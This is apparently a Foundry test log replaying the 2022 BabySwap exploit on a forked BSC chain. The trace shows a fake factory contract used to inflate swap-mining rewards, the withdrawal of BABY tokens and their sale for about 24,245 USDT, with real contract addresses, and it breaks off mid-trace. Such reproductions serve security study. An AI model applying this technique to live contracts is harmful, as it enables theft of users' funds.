Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.24s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1084:5:
     |
1084 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1896:5:
     |
1896 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2198:5:
     |
2198 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2967:5:
     |
2967 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:4424:5:
     |
4424 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:805:1:
    |
805 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 949.15ms (2.38ms CPU time)

Ran 1 test for src/test/2022-10/BabySwap_exp.sol:ContractTest
[PASS] testExploit() (gas: 1302990)
Logs:
  [Start] Attacker USDT balance before exploit: 0.000000000000000000
  [End] Attacker USDT balance before exploit: 24245.023699947778854742

Traces:
  [8713] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("bsc", 21811979 [2.181e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB_TOKEN")
    │   └─ ← [Return]
    ├─ [0] VM::label(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], "USDT_TOKEN")
    │   └─ ← [Return]
    ├─ [0] VM::label(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], "BABY_TOKEN")
    │   └─ ← [Return]
    ├─ [0] VM::label(BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], "BABYSWAP_ROUTER")
    │   └─ ← [Return]
    ├─ [0] VM::label(SWAP_MINING: [0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636], "SWAP_MINING")
    │   └─ ← [Return]
    ├─ [0] VM::label(BABYSWAP_FACTORY: [0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da], "BABYSWAP_FACTORY")
    │   └─ ← [Return]
    ├─ [0] VM::label(USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF], "USDT_BABY_BABYPAIR")
    │   └─ ← [Return]
    └─ ← [Stop]

  [1410890] ContractTest::testExploit()
    ├─ [2531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker USDT balance before exploit", val: 0, decimals: 18)
    ├─ [23731] WBNB_TOKEN::fallback{value: 20000}()
    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 20000 [2e4])
    │   ├─  storage changes:
    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 20000
    │   └─ ← [Stop]
    ├─ [24420] WBNB_TOKEN::approve(BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─  storage changes:
    │   │   @ 0xeb60deb0ff67ba2db361850d0345fccd7ef1f8ac0a9dcc58ac9170cc2cabb326: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   └─ ← [Return] true
    ├─ [24586] BABY_TOKEN::approve(BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─  storage changes:
    │   │   @ 0x6338997bf0e58a25f30d17bd97448508ecd9886521bf315dd2a88c3189420322: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   └─ ← [Return] true
    ├─ [333511] → new FakeFactory@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─  storage changes:
    │   │   @ 0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   └─ ← [Return] 1555 bytes of code
    ├─ [156968] BABYSWAP_ROUTER::swapExactTokensForTokens(10000 [1e4], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1664635590 [1.664e9])
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [573] FakeFactory::getReserves() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000000000 [1e28], 1, 0
    │   ├─ [0] console::969cdd03(000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000204fce5e3e25026110000000000000000000000000000000000000000000000000000000000000000000001572657365727665496e2c20726573657276654f75740000000000000000000000) [staticcall]
    │   │   └─ ← [Revert] revert: unknown selector `0x969cdd03` for ConsoleCalls
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [25325] WBNB_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000 [1e4])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10000 [1e4])
    │   │   ├─  storage changes:
    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 20000 → 10000
    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 10000
    │   │   └─ ← [Return] true
    │   ├─ [99591] SWAP_MINING::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 9999000099990000999900009999 [9.999e27])
    │   │   ├─  storage changes:
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec3: 0x0000000000000000000000000000000000000000034508fe27d7b6b4bd4652cf → 0x00000000000000000000000000000000000000002394039fb5d1c44bee44a8de
    │   │   │   @ 0xd30cf5c1f36a5df43ac358fcded93d26d6fdd6438fa56d374fa22568956a5b67: 0 → 0x0000000000000000000000000000000000000000204efaa18dfa0d9730fe560f
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec6: 0x00000000000000000000000000000000000000000000000000000000014cd2ab → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec5: 0x00000000000000000000000000000000000000000000b826176585b0c82c5fb1 → 0x00000000000000000000000000000000000000000000b8269f579d8b6e9cb348
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec2: 0x0000000000000000000000000000000000000000002d6f1042b34fc5365da1b5 → 0x0000000000000000000000000000000000000000207c69b1d0ad5d5c675bf7c4
    │   │   │   @ 0xd30cf5c1f36a5df43ac358fcded93d26d6fdd6438fa56d374fa22568956a5b68: 0 → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [7673] FakeFactory::swap(9999000099990000999900009999 [9.999e27], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [534] WBNB_TOKEN::balanceOf(FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10000 [1e4]
    │   │   ├─ [534] WBNB_TOKEN::balanceOf(FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10000 [1e4]
    │   │   ├─ [3262] WBNB_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000 [1e4])
    │   │   │   ├─ emit Transfer(from: FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000 [1e4])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 10000 → 0
    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 10000 → 20000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000027100000000000000000000000000000000000000000204efaa18dfa0d9730fe560f
    ├─ [157629] BABYSWAP_ROUTER::swapExactTokensForTokens(10000 [1e4], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1664635590 [1.664e9])
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [573] FakeFactory::getReserves() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000000000000 [1e28], 1, 0
    │   ├─ [0] console::969cdd03(000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000204fce5e3e25026110000000000000000000000000000000000000000000000000000000000000000000001572657365727665496e2c20726573657276654f75740000000000000000000000) [staticcall]
    │   │   └─ ← [Revert] revert: unknown selector `0x969cdd03` for ConsoleCalls
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [23325] WBNB_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000 [1e4])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10000 [1e4])
    │   │   ├─  storage changes:
    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 10000
    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 20000 → 10000
    │   │   └─ ← [Return] true
    │   ├─ [111252] SWAP_MINING::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], 9999000099990000999900009999 [9.999e27])
    │   │   ├─ [2622] BABYSWAP_FACTORY::getPair(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   └─ ← [Return] USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]
    │   │   ├─ [18868] 0xb81D4780780e5B66ba80a17e8c496Dd1616FA468::consult(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], 9999000099990000999900009999 [9.999e27], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   ├─ [1023] BABYSWAP_FACTORY::expectPairFor(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000e730c7b7470447ad4886c763247012dfd233baff
    │   │   │   ├─ [2387] USDT_BABY_BABYPAIR::price0CumulativeLast() [staticcall]
    │   │   │   │   └─ ← [Return] 82293577594793819909047027029596428220505 [8.229e40]
    │   │   │   ├─ [2409] USDT_BABY_BABYPAIR::price1CumulativeLast() [staticcall]
    │   │   │   │   └─ ← [Return] 1631319042814632560702633197480418340766151 [1.631e42]
    │   │   │   ├─ [2517] USDT_BABY_BABYPAIR::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 26548588592589994820727298 [2.654e25], 654602452026428096640971 [6.546e23], 1664635302 [1.664e9]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000cbf7f850badaeac25ea9e3
    │   │   ├─  storage changes:
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fce: 0x00000000000000000000000000000000000000000000000000000000014cd2e1 → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fcd: 0x00000000000000000000000000000000000000000000268817898a3e97d3440d → 0x000000000000000000000000000000000000000000002688236eb921b996b1c3
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fca: 0x0000000000000000000000000000000000000000001cfdcd2fccf31de8184dc8 → 0x000000000000000000000000000000000000000000e8f5c58087ce08aa76f7ab
    │   │   │   @ 0x6c888d3988d5a6aa12caacc351a57c606c272a706a1379bf9712389c561a10ed: 0 → 0x000000000000000000000000000000000000000000cbf7f850badaeac25ea9e3
    │   │   │   @ 0x6c888d3988d5a6aa12caacc351a57c606c272a706a1379bf9712389c561a10ee: 0 → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fcb: 0x000000000000000000000000000000000000000000c860d56f302481a87b74e6 → 0x0000000000000000000000000000000000000000019458cdbfeaff6c6ada1ec9
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [928] FakeFactory::getPair(WBNB_TOKEN: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657]) [staticcall]
    │   │   └─ ← [Return] FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
    │   ├─ [7673] FakeFactory::swap(9999000099990000999900009999 [9.999e27], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [534] WBNB_TOKEN::balanceOf(FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10000 [1e4]
    │   │   ├─ [534] WBNB_TOKEN::balanceOf(FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 10000 [1e4]
    │   │   ├─ [3262] WBNB_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000 [1e4])
    │   │   │   ├─ emit Transfer(from: FakeFactory: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000 [1e4])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 10000 → 0
    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 10000 → 20000
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─  storage changes:
    │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 10000
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000027100000000000000000000000000000000000000000204efaa18dfa0d9730fe560f
    ├─ [443745] SWAP_MINING::takerWithdraw()
    │   ├─ [0] console::f5b1bba9(00000000000000000000000000000000000000000000d8e1a42105f355953ae5) [staticcall]
    │   │   └─ ← [Revert] revert: unknown selector `0xf5b1bba9` for ConsoleCalls
    │   ├─ [30027] BABY_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1024193504457067137940197 [1.024e24])
    │   │   ├─ emit Transfer(from: SWAP_MINING: [0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1024193504457067137940197 [1.024e24])
    │   │   ├─  storage changes:
    │   │   │   @ 0xe128f0e15def02ed869a856089d559a1aae047d2a48ae2cb035ed6464d25a41d: 0x000000000000000000000000000000000000000000363701cdc2f9f629fef344 → 0x000000000000000000000000000000000000000000355e2029a1f402d469b85f
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000000d8e1a42105f355953ae5
    │   │   └─ ← [Return] true
    │   ├─  storage changes:
    │   │   @ 0x6c888d3988d5a6aa12caacc351a57c606c272a706a1379bf9712389c561a10ed: 0x000000000000000000000000000000000000000000cbf7f850badaeac25ea9e3 → 0
    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec2: 0x0000000000000000000000000000000000000000207c69b1d0ad5d5c675bf7c4 → 0x0000000000000000000000000000000000000000002d6f1042b34fc5365da1b5
    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fca: 0x000000000000000000000000000000000000000000e8f5c58087ce08aa76f7ab → 0x0000000000000000000000000000000000000000001cfdcd2fccf31de8184dc8
    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1ec5: 0x00000000000000000000000000000000000000000000b8269f579d8b6e9cb348 → 0x0000000000000000000000000000000000000000000001018c21f0a23df33b0b
    │   │   @ 0xd30cf5c1f36a5df43ac358fcded93d26d6fdd6438fa56d374fa22568956a5b67: 0x0000000000000000000000000000000000000000204efaa18dfa0d9730fe560f → 0
    │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1fcd: 0x000000000000000000000000000000000000000000002688236eb921b996b1c3 → 0x0000000000000000000000000000000000000000000004cb9283601794aaef1b
    │   └─ ← [Stop]
    ├─ [487] BABY_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1024193504457067137940197 [1.024e24]
    ├─ [171837] BABYSWAP_ROUTER::swapExactTokensForTokens(1024193504457067137940197 [1.024e24], 0, [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657, 0x55d398326f99059fF775485246999027B3197955], [0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da], [3000], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1664635590 [1.664e9])
    │   ├─ [622] BABYSWAP_FACTORY::getPair(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]
    │   ├─ [622] BABYSWAP_FACTORY::getPair(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]
    │   ├─ [517] USDT_BABY_BABYPAIR::getReserves() [staticcall]
    │   │   └─ ← [Return] 26548588592589994820727298 [2.654e25], 654602452026428096640971 [6.546e23], 1664635302 [1.664e9]
    │   ├─ [0] console::969cdd03(000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000015f5e1df15bdcd4ced7202000000000000000000000000000000000000000000008a9e11ed7d9a91b1f7cb000000000000000000000000000000000000000000000000000000000000001572657365727665496e2c20726573657276654f75740000000000000000000000) [staticcall]
    │   │   └─ ← [Revert] revert: unknown selector `0x969cdd03` for ConsoleCalls
    │   ├─ [10794] BABY_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6BEF4238761aEE8eA773405D60bA93CD183d41d3, 1024193504457067137940 [1.024e21])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6BEF4238761aEE8eA773405D60bA93CD183d41d3, value: 1024193504457067137940 [1.024e21])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], value: 115792089237316195423570985008687907853269984665640564038433390503456062501995 [1.157e77])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000d8e1a42105f355953ae5 → 0x00000000000000000000000000000000000000000000d8aa1e96c00e7ba42f51
    │   │   │   @ 0x6338997bf0e58a25f30d17bd97448508ecd9886521bf315dd2a88c3189420322: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffc87a75ba1b260ef46b
    │   │   │   @ 0xb7aea90d9effc8ae0e4a38ac6f9426ce5143c21a710a9f89a4f80be396070b91: 0x000000000000000000000000000000000000000000000005b514ccdde2e397d1 → 0x00000000000000000000000000000000000000000000003d3a9f12c2bcd4a365
    │   │   └─ ← [Return] true
    │   ├─ [622] BABYSWAP_FACTORY::getPair(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]
    │   ├─ [10794] BABY_TOKEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF], 1023169310952610070802257 [1.023e24])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF], value: 1023169310952610070802257 [1.023e24])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], value: 115792089237316195423570985008687907853269984665640563015264079550845991699738 [1.157e77])
    │   │   ├─  storage changes:
    │   │   │   @ 0x6338997bf0e58a25f30d17bd97448508ecd9886521bf315dd2a88c3189420322: 0xffffffffffffffffffffffffffffffffffffffffffffffc87a75ba1b260ef46b → 0xffffffffffffffffffffffffffffffffffffffffffff271e5bdefa0caa6ac51a
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000000d8aa1e96c00e7ba42f51 → 0
    │   │   │   @ 0x1eccbb4934a720c78da31ca88af2ae5a133062cbe10d4bbbffb543572af07bd2: 0x00000000000000000000000000000000000000000015f5e1df15bdcd4ced7202 → 0x00000000000000000000000000000000000000000016ce8bfdac7ddbc891a153
    │   │   └─ ← [Return] true
    │   ├─ [77581] SWAP_MINING::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 24245023699947778854742 [2.424e22])
    │   │   ├─  storage changes:
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eb9: 0x000000000000000000000000000000000000000000012dbed0cea94377d813e2 → 0x000000000000000000000000000000000000000000012dbfaa5202a14ef2333a
    │   │   │   @ 0x3835ca2c2a97ccb41a6d08ea51b3689e7336d0a1e7bd2e142f2f2ea8620959c2: 0 → 0x000000000000000000000000000000000000000000000522534b57762a41cf56
